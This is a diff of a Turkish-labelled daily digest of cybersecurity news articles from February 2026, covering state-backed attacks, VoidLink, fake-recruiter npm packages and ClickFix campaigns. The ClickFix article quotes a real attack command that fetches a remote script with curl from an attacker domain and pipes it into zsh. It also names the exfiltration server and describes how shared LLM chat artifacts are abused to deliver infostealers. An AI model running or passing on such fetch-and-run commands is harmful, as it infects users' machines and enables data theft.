@@ -1,6 +1,6 @@
 
 ================================================================================
-📅 13 FEBRUARY 2026 - SİBER GÜVENLİK HABERLERİ (HAM RSS)
+📅 14 FEBRUARY 2026 - SİBER GÜVENLİK HABERLERİ (HAM RSS)
 ================================================================================
 
 [1] The Hacker News - Google Ties Suspected Russian Actor to CANFAIL Malware Attacks on Ukrainian Orgs
@@ -11,7 +11,7 @@ Link: https://thehackernews.com/2026/02/google-ties-suspected-russian-actor-to.h
 [TAM METİN - 343 kelime]
 A previously undocumented threat actor has been attributed to attacks targeting Ukrainian organizations with malware known as CANFAIL.
 
-Google Threat Intelligence Group (GTIG) described the hack group as possibly affiliated with Russian intelligence services. The threat actor is assessed to have targeted defense, military, government, and energy organizations within the Ukrainian regional and national governments.
+Google Threat Intelligence Group (GTIG) described the hacking group as possibly affiliated with Russian intelligence services. The threat actor is assessed to have targeted defense, military, government, and energy organizations within the Ukrainian regional and national governments.
 
 However, the group has also exhibited growing interest in aerospace organizations, manufacturing companies with military and drone ties, nuclear and chemical research organizations, and international organizations involved in conflict monitoring and humanitarian aid in Ukraine, GTIG added.
 
@@ -29,7 +29,7 @@ Typically disguised with a double extension to pass off as a PDF document (*.pdf
 
 Google said the threat actor is also linked to a campaign called PhantomCaptcha that was disclosed by SentinelOne SentinelLABS in October 2025 as targeting organizations associated with Ukraine's war relief efforts through phishing emails that direct recipients to fake pages hosting ClickFix-style instructions to activate the infection sequence and deliver a WebSocket-based trojan.
 
-(XXXXXXX, AÇIK - thehackernews.com, 13.02.2026)
+(XXXXXXX, AÇIK - thehackernews.com, 14.02.2026)
 
 ================================================================================
 
@@ -38,7 +38,7 @@ Google said the threat actor is also linked to a campaign called PhantomCaptcha 
 Tarih: Fri, 13 Feb 2026 21:53:00 +0530
 Link: https://thehackernews.com/2026/02/google-links-china-iran-russia-north.html
 
-[TAM METİN - 891 kelime]
+[TAM METİN - 957 kelime]
 Several state-sponsored actors, hacktivist entities, and criminal groups from China, Iran, North Korea, and Russia have trained their sights on the defense industrial base (DIB) sector, according to findings from Google Threat Intelligence Group (GTIG).
 
 The tech giant's threat intelligence division said the adversarial targeting of the sector is centered around four key themes: striking defense entities deploying technologies on the battlefield in the Russia-Ukraine War, directly approaching employees and exploitation of the hiring process by North Korean and Iranian actors, use of edge devices and appliances as initial access pathways for China-nexus groups, and supply chain risk stemming from the breach of the manufacturing sector.
@@ -81,11 +81,13 @@ UNC6508, a China-nexus threat cluster that targeted a U.S.-based research instit
 
 In addition, Google said it has also observed China-nexus threat groups utilizing operational relay box (ORB) networks for reconnaissance against defense industrial targets, thereby complicating detection and attribution efforts.
 
+ORBs confer several advantages to threat actors, allowing them to route their traffic through home or commercial networks, blend with regular network traffic, circumvent geofencing security controls, and pre-position themselves to a target's perimeter ahead of a cyber attack. ORBs are also resilient to takedown attempts, as attackers managing them can scale these networks to add more devices, even if some nodes are discovered and blocked.
+
 "While specific risks vary by geographic footprint and sub-sector specialization, the broader trend is clear: the defense industrial base is under a state of constant, multi-vector siege," Google said. "Financially motivated actors carry out extortion against this sector and the broader manufacturing base, like many of the other verticals they target for monetary gain."
 
 "The campaigns against defense contractors in Ukraine, threats to or exploitation of defense personnel, the persistent volume of intrusions by China-nexus actors, and the hack, leak, and disruption of the manufacturing base are some of the leading threats to this industry today."
 
-(XXXXXXX, AÇIK - thehackernews.com, 13.02.2026)
+(XXXXXXX, AÇIK - thehackernews.com, 14.02.2026)
 
 ================================================================================
 
@@ -94,7 +96,7 @@ In addition, Google said it has also observed China-nexus threat groups utilizin
 Tarih: Fri, 13 Feb 2026 20:53:00 +0530
 Link: https://thehackernews.com/2026/02/uat-9921-deploys-voidlink-malware-to.html
 
-[TAM METİN - 654 kelime]
+[TAM METİN - 723 kelime]
 A previously unknown threat actor tracked as UAT-9921 has been observed leveraging a new modular framework called VoidLink in its campaigns targeting the technology and financial services sectors, according to findings from Cisco Talos.
 
 "This threat actor seems to have been active since 2019, although they have not necessarily used VoidLink over the duration of their activity," researchers Nick Biasini, Aaron Boyd, Asheer Malhotra, and Vitor Ventura said. "UAT-9921 uses compromised hosts to install VoidLink command-and-control (C2), which are then used to launch scanning activities both internal and external to the network."
@@ -103,13 +105,15 @@ VoidLink was first documented by Check Point last month, describing it as a feat
 
 In another analysis published earlier this week, Ontinue pointed out that the emergence of VoidLink presents a new concern where LLM-generated implants, packed with kernel-level rootkits and features to target cloud environments, can further lower the skill barrier required to produce hard-to-detect malware.
 
-Per Talos, UAT-9921 is believed to possess knowledge of the Chinese language, given the language of the framework, and the toolkit appears to be a recent addition. It is also believed that the development was split across teams, although the extent of the demarcation between development and the actual operations remains unclear.
+Per Talos, UAT-9921 is believed to possess knowledge of the Chinese language, given the language of the framework and code comments present in it. The toolkit is said to be a recent addition to its arsenal. It is also believed that the development was split across teams, although the extent of the demarcation between development and the actual operations remains unclear.
 
 "The operators deploying VoidLink have access to the source code of some [kernel] modules and some tools to interact with the implants without the C2," the researchers noted. "This indicates inner knowledge of the communication protocols of the implants."
 
 VoidLink is deployed as a post-compromise tool, allowing the adversary to sidestep detection. The threat actor has also been observed deploying a SOCKS proxy on compromised servers to launch scans for internal reconnaissance and lateral movement using open-source tools like Fscan.
 
 The cybersecurity company said it's aware of multiple VoidLink-related victims dating back to September 2025, indicating that work on the malware may have commenced much earlier than the November 2025 timeline pieced together by Check Point.
+
+When reached for comment regarding the latest findings, Pedro Drimel Neto, malware analysis lead at Check Point Software, told The Hacker News via email that they have not observed evidence of VoidLink "being used as of September 2025 and threat actor activity since 2019," and that "we cannot independently verify activity outside of the datasets and sources available to us."
 
 VoidLink uses three different programming languages: ZigLang for the implant, C for the plugins, and GoLang for the backend. It supports compilation on demand for plugins, providing support for the different Linux distributions that might be targeted. The plugins allow for gathering information, lateral movement, and anti-forensics.
 
@@ -125,105 +129,57 @@ What's more, there are signs that there exists a main implant that has been comp
 
 "This is a near-production-ready proof of concept," Talos said. "VoidLink is positioned to become an even more powerful framework based on its capabilities and flexibility."
 
-(XXXXXXX, AÇIK - thehackernews.com, 13.02.2026)
+(XXXXXXX, AÇIK - thehackernews.com, 14.02.2026)
 
 ================================================================================
 
-[4] BleepingComputer - Turning IBM QRadar Alerts into Action with Criminal IP
+[4] BleepingComputer - Fake job recruiters hide malware in developer coding challenges
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 10:05:15 -0500
-Link: https://www.bleepingcomputer.com/news/security/turning-ibm-qradar-alerts-into-action-with-criminal-ip/
+Tarih: Fri, 13 Feb 2026 17:35:37 -0500
+Link: https://www.bleepingcomputer.com/news/security/fake-job-recruiters-hide-malware-in-developer-coding-challenges/
 
-[TAM METİN - 686 kelime]
-Criminal IP (criminalip.io), the AI-powered threat intelligence and attack surface intelligence platform, is now integrated with IBM QRadar SIEM and QRadar SOAR.
+[TAM METİN - 718 kelime]
+A new variation of the fake recruiter campaign from North Korean threat actors is targeting JavaScript and Python developers with cryptocurrency-related tasks.
 
-The integration brings external, IP-based threat intelligence directly into IBM QRadar’s detection, investigation, and response workflows, enabling security teams to identify malicious activity faster and prioritize response actions more effectively across SOC operations.
+The activity has been ongoing since at least May 2025 and is characterized by modularity, which allows the threat actor to quickly resume it in case of partial compromise.
 
-IBM QRadar is widely adopted by enterprises and public-sector organizations as a central platform for security monitoring, automation, and incident response.
+The bad actor relies on packages published on the npm and PyPi registries that act as downloaders for a remote access trojan (RAT). In total, researchers found 192 malicious packages related to this campaign, which they dubbed 'Graphalgo'.
 
-By embedding Criminal IP intelligence into QRadar SIEM and extending it into SOAR workflows, organizations can apply external threat context across the incident lifecycle without leaving the QRadar environment.
+Researchers at software supply-chain security company ReversingLabs say that the threat actor creates fake companies in the blockchain and crypto-trading sectors and publishes job offerings on various platforms, like LinkedIn, Facebook, and Reddit.
 
-Real-Time Threat Visibility from Firewall Traffic Logs
+Developers applying for the job are required to show their skills by running, debugging, and improving a given project. However, the attacker's purpose is to make the applicant run the code.
 
-With the Criminal IP QRadar SIEM integration, security teams can analyze firewall traffic logs and automatically assess the risk associated with communicating IP addresses.
+This action would cause a malicious dependency from a legitimate repository to be installed and executed.
 
-Traffic data forwarded into IBM QRadar SIEM is analyzed through the Criminal IP API and reflected directly inside the SIEM interface.
+"It is easy to create such job task repositories. Threat actors simply need to take a legitimate bare-bone project and fix it up with a malicious dependency and it is ready to be served to targets," the researchers say.
 
-Observed IP addresses are automatically classified into High, Medium, or Low risk levels from a threat intelligence perspective.
+To hide the malicious nature of the dependencies, the hackers host the dependencies on legitimate platforms, like npm and PyPi.
 
-This allows SOC teams to quickly identify high-risk IPs, monitor inbound and outbound traffic, and prioritize response actions such as access blocking or escalation within the familiar QRadar SIEM workflow.
+In one case highlighted in the ReversingLabs report, a package named ‘bigmathutils,’ with 10,000 downloads, was benign until it reached version 1.1.0, which introduced malicious payloads. Shortly after, the threat actor removed the package, marking it as deprecated, likely to conceal the activity.
 
-Try Criminal IP to detect and respond to emerging threats
+The Graphalgo name of the campaign is derived from packages that have “graph” in their name. They typically impersonate legitimate, popular libraries like graphlib, the researchers say.
 
-Access Criminal IP's Threat Intelligence needed to proactively identify, analyze, and respond to emerging threats.
+However, from December 2025 onward, the North Korean actor shifted to packages with “big” in their name. However, ReversingLabs has not discovered the recruiting part, or the campaign frontend, related to them.
 
-Powered by AI and OSINT, it delivers threat scoring, reputation data, and real-time detection of a wide array of malicious indicators, ranging from C2 servers and IOCs to masking services like VPNs, proxies, and anonymous VPNs, across IPs, domains, and URLs. Its API-first architecture ensures seamless integration into security workflows to boost visibility, automation, and response.
+According to the researchers, the actor uses Github Organizations, which are shared accounts for collaboration across multiple projects. They say that the GitHub repositories are clean, and malicious code is introduced indirectly via dependencies hosted on npm and PyPI, which are the Graphalgo packages.
 
-Interactive Investigation Without Leaving QRadar
+Victims running the project as instructed in the interview infect their systems with these packages, which install a RAT payload on their machines.
 
-Beyond high-level visibility, the integration supports fast, in-context investigation. Analysts can right-click on IP addresses displayed in QRadar Log Activity to open a detailed Criminal IP IP report.
+It is worth noting that ReversingLabs researchers identified several developers that fell for the trick and contacted them for more details about the recruiting process.
 
-These reports provide additional context, including threat indicators, historical behavior, and external exposure signals, enabling analysts to validate risk and intent without switching tools. This streamlined workflow supports faster decision-making during time-sensitive investigations.
+The RAT can list the running processes on the host, execute arbitrary commands per instructions from the command-and-control (C2) server, and exfiltrate files or drop additional payloads.
 
-Extending Intelligence into QRadar SOAR Workflows
+The RAT checks whether the MetaMask cryptocurrency extension is installed on the victim’s browser, a clear indication of its money-stealing goals.
 
-Criminal IP is also integrated with IBM QRadar SOAR to support automated threat enrichment during incident response. Using pre-built playbooks, Criminal IP intelligence can be applied to IP address and URL artifacts, with enrichment results returned directly into SOAR cases as artifact hits or incident notes.
+Its C2 communication is token-protected to lock out unauthorized observers, a common tactic for North Korean hackers.
 
-This integration includes two playbooks:
+ReversingLabs has found multiple variants written in JavaScript, Python, and VBS, showing an intention to cover all possible targets.
 
-Criminal IP: IP Threat Service – Enriches IP address artifacts with Criminal IP threat context.
+The researchers’ attribute the Graphalgo fake recruiter campaign to the Lazarus group with medium-to-high confidence. The conclusion is based on the approach, the use of coding tests as an infection vector, and the cryptocurrency-focused targeting, all of which aligning with previous activity associated with the North Korean threat actor.
 
-Criminal IP: URL Threat Service – Performs lite or full URL scans and returns results as artifact hits or incident notes.
+Also, the researchers note the delayed activation of malicious code in the packages, consistent with Lazarus' patience displayed in other attacks. Finally, the Git commits show the GMT +9 time zone, matching North Korea time.
 
-By embedding Criminal IP threat intelligence directly into SOAR workflows, analysts can reduce manual lookups and respond to incidents more efficiently.
-
-Advancing Intelligence-Driven Detection and Response
-
-By integrating Criminal IP with IBM QRadar SIEM and SOAR, organizations can combine QRadar’s correlation, investigation, and response capabilities with context-rich external threat intelligence derived from real-world internet exposure.
-
-This approach improves detection accuracy, shortens investigation cycles, and enhances response prioritization across SOC operations.
-
-As alert volumes continue to grow, Criminal IP helps QRadar users make faster, more informed decisions by bringing external threat context directly into SIEM and SOAR workflows without adding operational complexity.
-
-AI SPERA CEO Byungtak Kang commented that the integration highlights the growing importance of real-time, exposure-based intelligence in modern SOC environments and underscores Criminal IP’s focus on improving detection confidence and operational efficiency through practical, intelligence-driven integrations.
-
-Criminal IP is the flagship cyber threat intelligence platform developed by AI SPERA and is used in more than 150 countries worldwide. It equips security teams with the actionable Threat Intelligence needed to proactively identify, analyze, and respond to emerging threats.
-
-Powered by AI and OSINT, it delivers threat scoring, reputation data, and real-time detection of a wide array of malicious indicators, ranging from C2 servers and IOCs to masking services like VPNs, proxies, and anonymous VPNs, across IPs, domains, and URLs.
-
-Its API-first architecture ensures seamless integration into security workflows to boost visibility, automation, and response.
-
-Sponsored and written by Criminal IP.
-
-(XXXXXXX, AÇIK - bleepingcomputer.com, 13.02.2026)
-
-================================================================================
-
-[5] BleepingComputer - CISA flags critical Microsoft SCCM flaw as exploited in attacks
-────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 07:35:09 -0500
-Link: https://www.bleepingcomputer.com/news/security/cisa-flags-microsoft-configmgr-rce-flaw-as-exploited-in-attacks/
-
-[TAM METİN - 434 kelime]
-CISA ordered U.S. government agencies on Thursday to secure their systems against a critical Microsoft Configuration Manager vulnerability patched in October 2024 and now exploited in attacks.
-
-Microsoft Configuration Manager (also known as ConfigMgr and formerly System Center Configuration Manager, or SCCM) is an IT administration tool for managing large groups of Windows servers and workstations.
-
-Tracked as CVE-2024-43468 and reported by offensive security company Synacktiv, this SQL injection vulnerability allows remote attackers with no privileges to gain code execution and run arbitrary commands with the highest level of privileges on the server and/or the underlying Microsoft Configuration Manager site database.
-
-"An unauthenticated attacker could exploit this vulnerability by sending specially crafted requests to the target environment which are processed in an unsafe manner enabling the attacker to execute commands on the server and/or underlying database," Microsoft explained when it patched the flaw in October 2024.
-
-At the time, Microsoft tagged it as "Exploitation Less Likely," saying that "an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product."
-
-However, Synacktiv shared proof-of-concept exploitation code for CVE-2024-43468 on November 26th, 2024, almost two months after Microsoft released security updates to mitigate this remote code execution vulnerability.
-
-While Microsoft has not yet updated its advisory with additional information, CISA has now flagged CVE-2024-43468 as actively exploited in the wild and has ordered Federal Civilian Executive Branch (FCEB) agencies to patch their systems by March 5th, as mandated by the Binding Operational Directive (BOD) 22-01.
-
-"These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise," the U.S. cybersecurity agency warned.
-
-"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable."
-
-Even though BOD 22-01 applies only to federal agencies, CISA encouraged all network defenders, including those in the private sector, to secure their devices against ongoing CVE-2024-43468 attacks as soon as possible.
+The complete indicators of compromise (IoCs) are available in the original report. Developers who installed the malicious packages at any point should rotate all tokens and account passwords and reinstall their OS.
 
 The future of IT infrastructure is here
 
@@ -231,47 +187,61 @@ Modern IT infrastructure moves faster than manual workflows can handle.
 
 In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
 
-CISA flags critical SolarWinds RCE flaw as exploited in attacks
+North Korean hackers use new macOS malware in crypto-theft attacks
 
-CISA orders feds to patch Gogs RCE flaw exploited in zero-day attacks
+Hugging Face abused to spread thousands of Android malware variants
 
-Critical BeyondTrust RCE flaw now exploited in attacks, patch now
+Konni hackers target blockchain engineers with AI-built malware
 
-CISA warns of SmarterMail RCE flaw used in ransomware attacks
+Hacker arrested for KMSAuto malware campaign with 2.8 million downloads
 
-CISA says critical VMware RCE flaw now actively exploited
+France arrests Latvian for installing malware on Italian ferry
 
-(XXXXXXX, AÇIK - bleepingcomputer.com, 13.02.2026)
+(XXXXXXX, AÇIK - bleepingcomputer.com, 14.02.2026)
 
 ================================================================================
 
-[6] BleepingComputer - Microsoft fixes bug that blocked Google Chrome from launching
+[5] BleepingComputer - Claude LLM artifacts abused to push Mac infostealers in ClickFix attack
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 04:31:01 -0500
-Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-family-safety-bug-that-blocks-google-chrome-from-launching/
+Tarih: Fri, 13 Feb 2026 15:21:43 -0500
+Link: https://www.bleepingcomputer.com/news/security/claude-llm-artifacts-abused-to-push-mac-infostealers-in-clickfix-attack/
 
-[TAM METİN - 484 kelime]
-Microsoft has fixed a known issue causing its Family Safety parental control service to block Windows users from launching Google Chrome and other web browsers.
+[TAM METİN - 616 kelime]
+Threat actors are abusing Claude artifacts and Google Ads in ClickFix campaigns that deliver infostealer malware to macOS users searching for specific queries.
 
-Family Safety helps parents monitor their children's activity and provides screen time management, app controls, communication monitoring, content filtering, location tracking, and activity reports.
+At least two variants of the malicious activity have been observed in the wild, and more than 10,000 users have accessed the content with dangerous instructions.
 
-Microsoft acknowledged the bug in late June 2025 after widespread reports that users were unable to launch Google Chrome on their PCs or experienced the web browser randomly crashing on devices running Windows 10 22H2 and Windows 11 22H2 or later.
+A Claude artifact is content generated with Antropic’s LLM that has been made public by the author. It can be anything from instructions, guides, chunks of code, or other types of output that are isolated from the main chat and accessible to anyone via links hosted on the claude.ai domain.
 
-As explained at the time, the issue is caused by Family Safety's web filtering tool, which prompts children to ask their parents for approval to use other browsers. However, the bug also causes Family Safety to block new versions of previously approved web browsers, inadvertently preventing them from launching or causing them to shut down unexpectedly.
+An artifact's page warns users that the shown content was generated by the user and has not been verified for accuracy.
 
-"The blocking behavior continues to work, however, when a browser updates to a new version, the latest version of the browser cannot be blocked until we add it to the block list. Microsoft is currently adding the latest versions of Chrome and other browsers to the block list," the company notes on the Windows release health dashboard.
+Researchers at MacPaw's investigative division, Moonlock Lab, and at ad-blocking company AdGuard noticed the malicious search results being displayed for multiple queries, like “online DNS resolver,” “macOS CLI disk space analyzer,” and “HomeBrew.”
 
-"As Microsoft continues to update the block list, we've received reports of a new issue affecting Google Chrome and some browsers. When children try to open these browsers, they shut down unexpectedly."
+Malicious results promoted on Google Search lead to either a public Claude artifact or a Medium article impersonating Apple Support. In both cases, the user is instructed to paste a shell command into Terminal.
 
-Service‑side fix pushed in early February
+In the first variant of the attack, the command given for execution is: ‘echo "..." | base64 -D | zsh,’
 
-This week, Microsoft confirmed that it addressed the issue with a service‑side fix earlier this month, nearly eight months after first receiving reports of web browsers shutting down unexpectedly.
+while in the second, it’s: ‘true && cur""l -SsLfk --compressed "https://raxelpak[.]com/curl/[hash]" | zsh’.
 
-Affected users are advised to connect their devices to the Internet to receive the fix, which should address the bug and prevent similar problems in the future.
+Moonlock researchers discovered that the malicious Claude guide has already received at least 15,600 views, which could be an indication of the number of users falling for the trick.
 
-"This issue has been resolved through a service‑side fix. The rollout began early February 2026 and should reach all affected devices over the coming weeks," Microsoft said. "If your device presented this symptom, please let it connect to the internet to receive the resolution. No other action is required."
+AdGuard researchers observed the same guide a few days earlier, when it had 12,300 views.
 
-Those who can't get online to receive the fix are advised to turn on the 'Activity reporting' feature under Windows settings in Microsoft Family Safety, which will allow parents to receive approval requests as expected and allowlist newer browser versions.
+Running the command in Terminal fetches a malware loader for the MacSync infostealer, which exfiltrates sensitive information present on the system.
+
+According to the researchers, the malware establishes communication with the command-and-control (C2) infrastructure using a hardcoded token and API key, and spoofs a macOS browser user-agent to blend into normal activity.
+
+"The response is piped directly to osascript – the AppleScript handles the actual stealing (keychain, browser data, crypto wallets)," the researchers say.
+
+The stolen data is packaged into an archive at ‘/tmp/osalogging.zip,’ and then exfiltrated to the attacker's C2 at a2abotnet[.]com/gate via an HTTP POST request. In case of failure, the archive is split into smaller chunks, and exfiltration is retried eight times. After a successful upload, a cleanup step deletes all traces.
+
+MoonLock Lab found that both variants fetch the second stage from the same C2 address, indicating that the same threat actor is behind the observed activity.
+
+A similar campaign leveraged the chat sharing feature in ChatGPT and Grok to deliver the AMOS infostealer. In December 2025, researchers found the promoted  after researchers found ChatGPT and Grok conversations were being leveraged in ClickFix attacks targeting Mac users.
+
+The Claude variation of the attack indicates that abuse has expanded to other large language models (LLMs).
+
+Users are recommended to exert caution and avoid executing in Terminal commands they don't fully understand. As Kaspersky researchers noted in the past, asking the chatbot in the same conversation about the safety of the provided commands is a straightforward way to determine if they're safe or not.
 
 The future of IT infrastructure is here
 
@@ -279,17 +249,71 @@ Modern IT infrastructure moves faster than manual workflows can handle.
 
 In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
 
-Microsoft: January update shutdown bug affects more Windows PCs
+New MacSync malware dropper evades macOS Gatekeeper checks
 
-Microsoft shares workaround for Outlook freezes after Windows update
+North Korean hackers use new macOS malware in crypto-theft attacks
 
-Microsoft fixes bug causing password sign-in option to disappear
+New GlassWorm attack targets macOS via compromised OpenVSX extensions
 
-Microsoft releases OOB Windows updates to fix shutdown, Cloud PC bugs
+New ClickFix attacks abuse Windows App-V scripts to push malware
 
-Microsoft: Some Windows PCs fail to shut down after January update
+New ErrTraffic service enables ClickFix attacks via fake browser glitches
 
-(XXXXXXX, AÇIK - bleepingcomputer.com, 13.02.2026)
+(XXXXXXX, AÇIK - bleepingcomputer.com, 14.02.2026)
+
+================================================================================
+
+[6] BleepingComputer - Louis Vuitton, Dior, and Tiffany fined $25 million over data breaches
+────────────────────────────────────────────────────────────────────────────────
+Tarih: Fri, 13 Feb 2026 13:35:15 -0500
+Link: https://www.bleepingcomputer.com/news/security/louis-vuitton-dior-and-tiffany-fined-25-million-over-data-breaches/
+
+[TAM METİN - 565 kelime]
+South Korea has fined luxury fashion brands Louis Vuitton, Christian Dior Couture, and Tiffany $25 million for failing to implement adequate security measures, which facilitated unauthorized access and the exposure of data belonging to more than 5.5 million customers.
+
+All three brands are part of the Louis Vuitton Moët Hennessy (LVMH) group and suffered data breaches [1, 2, 3] after hackers gained access to their cloud-based customer management service.
+
+The Personal Information Protection Commission (PIPC) in South Korea says that in the case of Louis Vuitton, an employee’s device was infected with malware, which led to compromising their software-as-a-service (SaaS) and leaking of data for 3.6 million customers.
+
+Although the product isn’t named, Google researchers linked the campaigns to the ShinyHunters gang, who targeted Salesforce platforms. The threat actor later claimed the breach of LVMH systems.
+
+The breaches at the three regional brands last year exposed sensitive customer data, including names, phone numbers, email addresses, postal addresses, and purchase histories.
+
+PIPC says that Louis Vuitton had been operating the SaaS tool since 2013, but "did not restrict access rights to Internet Protocol (IP) addresses, etc., and did not apply secure authentication methods when personal information handlers accessed the service from outside."
+
+For failing to adequately secure access to customer data, the South Korean data protection agency imposed a $16.4 million fine on Louis Vuitton and ordered the company to announce the penalty on its business website.
+
+At Dior, the breach occurred via a phishing attack on a customer service employee, who was tricked into granting the hacker access to the SaaS system, exposing data for 1.95 million customers.
+
+Dior had been using the system since 2020, but didn’t implement allow-lists, didn’t place bulk data download restrictions, and failed to inspect access logs, delaying the discovery of the breach for over three months.
+
+Additionally, Dior South Korea disclosed the breach to PIPC five days after learning about it. Under PIPA, organizations are required to notify the data protection agency within 72 hours from the time of becoming aware of a personal information leak.
+
+Due to these violations, PIPC announced a $9.4 million financial penalty for Dior South Korea.
+
+Tiffany was breached in a similar way, with attackers using voice phishing to trick a customer service employee into giving them access to the SaaS system. However, the impact was far lower in this case, with 4,600 clients exposed.
+
+Similar to the other two cases, Tiffany also neglected to implement IP-based access controls and bulk data download restrictions and did not notify impacted individuals within the legally specified time frame. The brand received a $1.85 million fine.
+
+PIPC emphasized that SaaS solutions do not exempt companies from their responsibility to securely manage client data, nor does it transfer that responsibility to the vendors of these solutions.
+
+The future of IT infrastructure is here
+
+Modern IT infrastructure moves faster than manual workflows can handle.
+
+In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
+
+France fines Free Mobile €42 million over 2024 data breach incident
+
+Coupang to split $1.17 billion among 33.7 million data breach victims
+
+Odido data breach exposes personal info of 6.2 million customers
+
+Volvo Group North America customer data exposed in Conduent hack
+
+Match Group breach exposes data from Hinge, Tinder, OkCupid, and Match
+
+(XXXXXXX, AÇIK - bleepingcomputer.com, 14.02.2026)
 
 ================================================================================
 
@@ -343,7 +367,7 @@ Who Benefitted from the Aisuru and Kimwolf Botnets?
 
 A Broken System Fueling Botnets (Synthient).
 
-(XXXXXXX, AÇIK - krebsonsecurity.com, 13.02.2026)
+(XXXXXXX, AÇIK - krebsonsecurity.com, 14.02.2026)
 
 ================================================================================
 
@@ -387,7 +411,7 @@ Goettl noted that Mozilla has released updates for Firefox and Firefox ESR reso
 
 As ever, the SANS Internet Storm Center has a per-patch breakdown by severity and urgency. Windows admins should keep an eye on askwoody.com for any news about patches that don’t quite play nice with everything. If you experience any issues related installing January’s patches, please drop a line in the comments below.
 
-(XXXXXXX, AÇIK - krebsonsecurity.com, 13.02.2026)
+(XXXXXXX, AÇIK - krebsonsecurity.com, 14.02.2026)
 
 ================================================================================
 
@@ -487,7 +511,7 @@ Both Synthient and XLabs say Kimwolf targets a vast number of Android TV streami
 
 If you own a TV box that matches one of these model names and/or numbers, please just rip it out of your network. If you encounter one of these devices on the network of a family member or friend, send them a link to this story (or to our January 2 story on Kimwolf) and explain that it’s not worth the potential hassle and harm created by keeping them plugged in.
 
-(XXXXXXX, AÇIK - krebsonsecurity.com, 13.02.2026)
+(XXXXXXX, AÇIK - krebsonsecurity.com, 14.02.2026)
 
 ================================================================================
 
@@ -535,7 +559,7 @@ According to the breach disclosure Nelnet Servicing informed Edfinancial and OSL
 
 Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.
 
-(XXXXXXX, AÇIK - threatpost.com, 13.02.2026)
+(XXXXXXX, AÇIK - threatpost.com, 14.02.2026)
 
 ================================================================================
 
@@ -591,7 +615,7 @@ The group has, in the past, expanded well beyond Australasia. According to a Dep
 
 Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”
 
-(XXXXXXX, AÇIK - threatpost.com, 13.02.2026)
+(XXXXXXX, AÇIK - threatpost.com, 14.02.2026)
 
 ================================================================================
 
@@ -639,11 +663,45 @@ To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene ar
 
 “Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”
 
-(XXXXXXX, AÇIK - threatpost.com, 13.02.2026)
+(XXXXXXX, AÇIK - threatpost.com, 14.02.2026)
 
 ================================================================================
 
-[13] Security Affairs - Attackers exploit BeyondTrust CVE-2026-1731 within hours of PoC release
+[13] Security Affairs - New threat actor UAT-9921 deploys VoidLink against enterprise sectors
+────────────────────────────────────────────────────────────────────────────────
+Tarih: Fri, 13 Feb 2026 22:18:18 +0000
+Link: https://securityaffairs.com/187969/ai/new-threat-actor-uat-9921-deploys-voidlink-against-enterprise-sectors.html
+
+[TAM METİN - 583 kelime]
+Cisco Talos spotted a previously unknown threat actor, tracked as UAT-9921, using a new modular attack framework called VoidLink. The group targets organizations in the technology and financial services sectors. The flexible design of VoidLink suggests the actor can adapt tools and techniques to different victims and campaign needs.
+
+“Cisco Talos recently discovered a new threat actor, UAT-9921, leveraging VoidLink in campaigns. Their activities may go as far back as 2019, even without VoidLink. The VoidLink compile-on-demand feature lays down the foundations for AI-enabled attack frameworks, which can create tools on-demand for their operators.” reads the report published by Talos. “Cisco Talos found clear indications that implants also exist for Windows, with the capability to load plugins.”
+
+VoidLink is a new modular Linux-focused attack framework first spotted by Check Point and used by threat actor UAT-9921, which has been active since at least 2019.
+
+“Talos is aware of multiple VoidLink-related victims dating back to September with the activity continuing through to January 2026.” continues the report. “This finding does not necessarily contradict the Checkpoint Research mentions of late November since the presented documents show development dates from version 2.0 and Cisco Talos assesses that this was still version 1.0.”
+
+The group installs VoidLink on compromised servers to establish command-and-control, hide activity, and scan networks internally and externally. Talos assesses that the actor likely has Chinese-language knowledge and that VoidLink development appears to be supported by AI-enabled coding tools, though operations do not rely on AI. UAT-9921 gains access using stolen credentials or by exploiting Java serialization flaws such as Apache Dubbo. Victims include technology and financial firms, but broad network scanning suggests opportunistic targeting.
+
+Since 2022, Cisco Talos has tracked fast-evolving single-file attack frameworks like Manjusaka and Alchimist. VoidLink marks a major step forward, keeping the single-file model but delivering a more advanced, “defense-contractor grade” implant platform. Built quickly with AI-enabled development tools, it combines Zig for implants, C for plugins, and Go for the backend, and can compile plugins on demand for different Linux targets.
+
+Talos warns this model could soon support AI-driven tool creation, where implants request custom exploits or modules from C2 servers in real time. This would speed lateral movement, enable unique attack tools, and make detection far harder.
+
+“Of course, this may just be an intermediate step, assuming that there is a human operator managing the environment exploration. However, it likely will not be long before we begin to uncover malicious agents doing the initial stages of exploration and lateral movement before human intervention.” continues the report.
+
+“This has an impact of reducing compromise attack metrics — namely, the time to lateral movement and time to focused data exfiltration. It also allows the generation of never-before-seen tools and the constant change in the attacker’s behavior, making detection more difficult.”
+
+Talos researchers states that VoidLink stands out as a “defense contractor–grade” framework with built-in auditing and role-based access control (SuperAdmin, Operator, Viewer). Its mesh peer-to-peer design lets implants relay traffic for one another, bypassing network limits. The malware is focused on Linux, and implements advanced capabilities such as eBPF/LKM rootkits, container escape, privilege escalation, cloud awareness, and EDR evasion. Though mainly Linux-based, evidence suggests possible Windows support. With modular plugins, stealth, and anti-analysis features, VoidLink shows strong potential to evolve into a highly powerful attack platform.
+
